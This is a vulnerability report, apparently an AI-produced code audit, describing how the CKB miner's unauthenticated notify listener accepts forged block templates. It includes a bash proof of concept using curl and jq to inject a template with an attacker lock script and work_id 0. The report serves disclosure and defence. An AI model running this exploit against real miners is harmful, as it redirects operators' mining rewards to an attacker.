Now I have all the code I need. Let me analyze the complete attack path.

### Title
Unauthenticated TCP Notify Listener Allows Local Attacker to Redirect Mining Rewards via Crafted BlockTemplate — (`miner/src/client.rs`)

---

### Summary

When the CKB miner is configured in notify mode (`listen` set in `[miner.client]`), it binds an unauthenticated HTTP server. Any local process (or any process that can reach the port) can POST a crafted `BlockTemplate` JSON payload that the miner will immediately adopt as its active work, causing it to mine blocks whose coinbase reward is paid to the attacker's lock script.

---

### Finding Description

`listen_block_template_notify` binds a raw `TcpListener` and dispatches every incoming connection to the `handle` free function: [1](#0-0) [2](#0-1) 

The `handle` function performs **no authentication, no IP allowlist check, and no shared-secret verification** of any kind: [3](#0-2) 

Any body that deserializes as `BlockTemplate` is immediately forwarded to `update_block_template`. The only guard inside that function is a `work_id` comparison: [4](#0-3) 

The condition `id != work_id || id == 0` means: accept the new template if the incoming `work_id` differs from the current one **or** if the current stored id is zero. An attacker who sends `work_id = 0` will always satisfy `id != work_id` once the miner has received at least one legitimate template (current id is non-zero), guaranteeing injection. Alternatively, any `work_id` value that differs from the current one is accepted, and the attacker can simply try sequential values or use `0`.

The accepted template is converted to a `Work` and pushed onto `new_work_tx`, which the miner workers consume immediately: [5](#0-4) 

---

### Impact Explanation

The `BlockTemplate` type carries the full cellbase transaction, including its output lock script (the address that receives the block reward), all included transactions, and the DAO field. By substituting these fields, the attacker causes the miner to:

1. Solve PoW on a block whose cellbase pays the reward to the attacker's lock script.
2. Submit that block via `submit_block` to the CKB node.

The node's `submit_block` verifies PoW, timestamp, epoch, and parent hash via `HeaderVerifier`, but **does not constrain the cellbase lock script to any specific address** — any valid script is consensus-legal: [6](#0-5) 

The block is accepted by the network, and all mining rewards for that block are permanently redirected to the attacker. The miner operator receives nothing.

---

### Likelihood Explanation

- **Notify mode is a documented, production-supported feature** configured via `listen` in `ckb-miner.toml` and `notify` in `ckb.toml`. [7](#0-6) 
- The default bind address is a `SocketAddr` chosen by the operator; if bound to `127.0.0.1` it is reachable by any local unprivileged process; if bound to `0.0.0.0` it is reachable over the network.
- No privilege escalation is required. A standard TCP connect + HTTP POST is sufficient.
- The `work_id = 0` bypass makes injection reliable regardless of the current mining state.
- The attack is silent: the miner logs nothing unusual, and the operator has no indication that the submitted block pays a different address.

---

### Recommendation

1. **Bind-address restriction**: Default the listen address to `127.0.0.1` only and document the risk of binding to `0.0.0.0`.
2. **Shared-secret token**: Require a configurable bearer token or HMAC-signed request header; reject requests that do not present it in `handle`.
3. **Source IP allowlist**: Accept connections only from the configured CKB node's IP (extractable from `rpc_url`).
4. **Work-id integrity**: Include a node-generated nonce in the template that the miner verifies before accepting a notify payload, preventing replay/injection even if the port is reachable.

---

### Proof of Concept

```bash
# 1. Start ckb-miner with notify mode enabled in ckb-miner.toml:
#    [miner.client]
#    listen = "127.0.0.1:18114"

# 2. Fetch a legitimate template to learn the current structure:
TEMPLATE=$(curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_block_template","params":[null,null,null]}' \
  | jq '.result')

# 3. Craft a modified template: replace cellbase output lock with attacker's lock,
#    set work_id to 0 to guarantee acceptance.
EVIL=$(echo "$TEMPLATE" | jq '
  .work_id = "0x0" |
  .cellbase.data.outputs[0].lock.args = "0xATTACKER_PUBKEY_HASH"
')

# 4. POST the evil template directly to the miner's notify listener:
curl -s -X POST http://127.0.0.1:18114 \
  -H 'Content-Type: application/json' \
  -d "$EVIL"

# 5. The miner now mines on the attacker's template.
#    The next solved block will pay rewards to 0xATTACKER_PUBKEY_HASH.
```

### Citations

**File:** miner/src/client.rs (L234-235)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
```

**File:** miner/src/client.rs (L241-242)
```rust
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** rpc/src/module/miner.rs (L274-277)
```rust
        // Verify header
        HeaderVerifier::new(snapshot, consensus)
            .verify(&header)
            .map_err(|err| handle_submit_error(&work_id, &err))?;
```

**File:** util/app-config/src/configs/miner.rs (L28-29)
```rust
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
```
